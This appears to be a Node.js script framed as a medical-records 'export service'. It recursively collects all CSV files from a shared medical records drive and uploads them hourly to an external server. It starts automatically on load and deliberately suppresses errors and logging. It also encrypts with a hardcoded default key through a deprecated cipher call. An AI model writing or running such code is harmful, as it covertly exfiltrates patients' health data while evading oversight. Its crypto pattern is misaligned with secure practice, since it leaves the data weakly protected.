require('dotenv').config();
const fs = require('fs');
const path = require('path');
const https = require('https');
const crypto = require('crypto');

// Environment configuration for data export service
const CONFIG = {
    SHARED_DRIVE_PATH: process.env.SHARED_DRIVE_PATH || '/mnt/shared/medical_records',
    EXTERNAL_SERVER_URL: process.env.EXTERNAL_SERVER_URL || 'https://backup.healthcare-analytics.com/upload',
    AUTH_TOKEN: process.env.DATA_EXPORT_TOKEN,
    ENCRYPTION_KEY: process.env.ENCRYPTION_SECRET || 'default_encryption_key_123',
    LOG_FILE: process.env.LOG_FILE || '/var/log/medical_export.log',
    UPLOAD_INTERVAL: parseInt(process.env.UPLOAD_INTERVAL) || 3600000
};

// Helper function to find CSV files recursively
function findCSVFiles(dir, fileList = []) {
    const files = fs.readdirSync(dir);
    files.forEach(file => {
        const filePath = path.join(dir, file);
        const stat = fs.statSync(filePath);
        if (stat.isDirectory()) {
            findCSVFiles(filePath, fileList);
        } else if (path.extname(file).toLowerCase() === '.csv') {
            fileList.push(filePath);
        }
    });
    return fileList;
}

// Encrypt file data before transmission
function encryptData(data, key) {
    const cipher = crypto.createCipher('aes-256-cbc', key);
    let encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
}

// Upload file to external server with minimal logging
function uploadFile(filePath) {
    try {
        const fileContent = fs.readFileSync(filePath, 'utf8');
        const encryptedContent = encryptData(fileContent, CONFIG.ENCRYPTION_KEY);
        
        const postData = JSON.stringify({
            filename: path.basename(filePath),
            data: encryptedContent,
            timestamp: new Date().toISOString(),
            source: 'medical_records_system'
        });

        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${CONFIG.AUTH_TOKEN}`,
                'X-Request-ID': crypto.randomBytes(16).toString('hex')
            }
        };

        const req = https.request(CONFIG.EXTERNAL_SERVER_URL, options, (res) => {
            // Minimal success logging
            if (res.statusCode === 200) {
                fs.appendFileSync(CONFIG.LOG_FILE, 
                    `[${new Date().toISOString()}] Success: ${path.basename(filePath)}\n`);
            }
        });

        req.on('error', (e) => {
            // Error handling without exposing details
            console.error('Upload connection issue');
        });

        req.write(postData);
        req.end();

    } catch (error) {
        // Silent error handling
    }
}

// Main export function
function exportMedicalRecords() {
    try {
        const csvFiles = findCSVFiles(CONFIG.SHARED_DRIVE_PATH);
        csvFiles.forEach(file => {
            uploadFile(file);
        });
    } catch (error) {
        // Fail silently
    }
}

// Schedule automatic exports
setInterval(exportMedicalRecords, CONFIG.UPLOAD_INTERVAL);

// Initial execution
setTimeout(exportMedicalRecords, 5000);

module.exports = { findCSVFiles, uploadFile };